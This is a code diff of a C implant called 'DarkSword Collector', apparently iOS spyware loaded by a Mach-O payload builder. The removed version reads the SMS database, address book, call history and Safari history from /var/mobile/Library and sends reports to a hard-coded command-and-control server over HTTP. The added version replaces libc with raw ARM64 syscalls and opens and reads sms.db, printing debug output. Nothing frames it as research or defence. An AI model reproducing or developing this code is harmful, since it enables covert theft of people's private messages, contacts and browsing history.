@@ -1,96 +1,70 @@
 /**
- * DarkSword Collector v3 - Standard C edition
- * Uses libc functions instead of raw syscalls
- * Compiled with -nostdlib removed so PLT resolves via MachOPayloadBuilder
+ * DarkSword Collector v4 - Static buffers, raw syscalls
+ * NO libc, NO stack-heavy allocations
  */
-#include <string.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <sys/socket.h>
-#include <netinet/in.h>
-#include <arpa/inet.h>
 
-#define C2_HOST "192.168.110.111"
-#define C2_PORT 8081
-#define BUF_SIZE 16384
-
-static void _http_post(const char *body, int body_len) {
-    char http[4096];
-    int h = 0;
-    
-    h += snprintf(http + h, sizeof(http) - h,
-        "POST /api/v1/c2/report HTTP/1.1\r\n"
-        "Host: %s:%d\r\n"
-        "Content-Type: application/json\r\n"
-        "Content-Length: %d\r\n"
-        "Connection: close\r\n\r\n",
-        C2_HOST, C2_PORT, body_len);
-    
-    if (h + body_len < (int)sizeof(http)) {
-        memcpy(http + h, body, body_len);
-        h += body_len;
-    }
-    
-    int sock = socket(AF_INET, SOCK_STREAM, 0);
-    if (sock < 0) return;
-    
-    struct sockaddr_in addr;
-    memset(&addr, 0, sizeof(addr));
-    addr.sin_family = AF_INET;
-    addr.sin_port = htons(C2_PORT);
-    inet_pton(AF_INET, C2_HOST, &addr.sin_addr);
-    
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        close(sock);
-        return;
-    }
-    send(sock, http, h, 0);
-    close(sock);
+/* === Inline string functions === */
+static int _strlen(const char *s) { int n=0; while(s[n]) n++; return n; }
+static void _memcpy(char *dst, const char *src, int n) { for(int i=0;i<n;i++) dst[i]=src[i]; }
+static int _itoa(int val, char *buf) {
+    int i=0; char tmp[16]; int t=0;
+    if(val==0){buf[0]='0';buf[1]=0;return 1;}
+    while(val>0){tmp[t++]='0'+(val%10);val/=10;}
+    for(int j=t-1;j>=0;j--) buf[i++]=tmp[j];
+    buf[i]=0; return i;
 }
 
-static void _report(const char *platform, const char *username, const char *token) {
-    char body[2048];
-    snprintf(body, sizeof(body),
-        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
-        "\"data\":{\"platform\":\"%s\",\"username\":\"%s\",\"token\":\"%s\"}}",
-        platform, username, token);
-    _http_post(body, strlen(body));
+/* === Raw syscalls (no libc dependency) === */
+static long _syscall3(long n, long a, long b, long c) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    register long x2 __asm__("x2") = c;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1), "r"(x2) : "memory");
+    return x0;
+}
+static long _syscall2(long n, long a, long b) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    register long x1 __asm__("x1") = b;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16), "r"(x1) : "memory");
+    return x0;
+}
+static long _syscall1(long n, long a) {
+    register long x16 __asm__("x16") = n;
+    register long x0 __asm__("x0") = a;
+    __asm__ volatile("svc #0x80" : "+r"(x0) : "r"(x16) : "memory");
+    return x0;
 }
 
-static void _collect_file(const char *path, const char *platform) {
-    int fd = open(path, O_RDONLY);
-    if (fd < 0) {
-        char buf[512];
-        snprintf(buf, sizeof(buf),
-            "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
-            "\"data\":{\"platform\":\"%s\",\"username\":\"access_denied\",\"token\":\"%s\"}}",
-            platform, path);
-        _http_post(buf, strlen(buf));
-        return;
-    }
-    
-    char data[BUF_SIZE];
-    int n = read(fd, data, sizeof(data) - 1);
-    close(fd);
-    if (n <= 0) n = 0;
-    data[n] = 0;
-    
-    char body[512];
-    snprintf(body, sizeof(body),
-        "{\"deviceId\":1,\"reportType\":\"SOCIAL_ACCOUNT\","
-        "\"data\":{\"platform\":\"%s\",\"username\":\"read_success\",\"token\":\"%d bytes\"}}",
-        platform, n);
-    _http_post(body, strlen(body));
+#define SYS_open 5
+#define SYS_read 3
+#define SYS_close 6
+#define SYS_write 4
+
+static void _write_str(const char *msg) {
+    _syscall3(SYS_write, 2, (long)msg, _strlen(msg));
 }
 
-/* Entry point for MachOPayloadBuilder */
 void ds_start(void) {
-    _report("RawCollector", "started", "v3");
-    _collect_file("/var/mobile/Library/SMS/sms.db", "SMS");
-    _collect_file("/var/mobile/Library/AddressBook/AddressBook.sqlitedb", "Contacts");
-    _collect_file("/var/mobile/Library/CallHistoryDB/CallHistory.storedata", "CallHistory");
-    _collect_file("/var/mobile/Library/Safari/History.db", "Safari");
-    _report("RawCollector", "done", "all_files_attempted");
+    _write_str("[C] ds_start entered\n");
+
+    int fd = (int)_syscall2(SYS_open, (long)"/var/mobile/Library/SMS/sms.db", 0);
+    _write_str("[C] open done\n");
+
+    if (fd >= 0) {
+        char buf[256];
+        int n = (int)_syscall3(SYS_read, fd, (long)buf, 255);
+        _syscall1(SYS_close, fd);
+
+        _write_str("[C] read: ");
+        char cnt[8];
+        _itoa(n < 0 ? 0 : n, cnt);
+        _write_str(cnt);
+        _write_str(" bytes\n");
+    } else {
+        _write_str("[C] open failed\n");
+    }
+
+    _write_str("[C] ds_start done\n");
 }
